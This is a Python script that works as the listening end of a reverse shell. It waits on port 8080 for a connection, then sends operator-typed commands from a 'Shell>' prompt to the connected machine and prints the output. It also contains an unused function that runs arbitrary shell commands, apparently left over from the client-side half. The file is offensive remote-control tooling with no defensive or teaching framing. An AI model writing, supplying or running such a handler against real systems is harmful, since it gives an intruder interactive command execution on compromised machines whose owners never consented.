import socket
import subprocess
import os

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = str(e)
    return output

def main():
    SERVER_IP = "0.0.0.0"  # Listen on all interfaces
    SERVER_PORT = 8080
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((SERVER_IP, SERVER_PORT))
    server.listen(1)
    print("==================================================")
    print("[+] Listening for income TCP connection on port 8080")
    print("==================================================")
    
    client_socket, client_address = server.accept()
    print(f"[+] We got a connection from {client_address}")
    print("==================================================")
    
    while True:
        command = input("Shell> ")
        if command.lower() in ["exit", "quit"]:
            break
        client_socket.send(command.encode())
        
        output = client_socket.recv(4096).decode()
        print(output)
    
    client_socket.close()
    server.close()
    
if __name__ == "__main__":
    main()
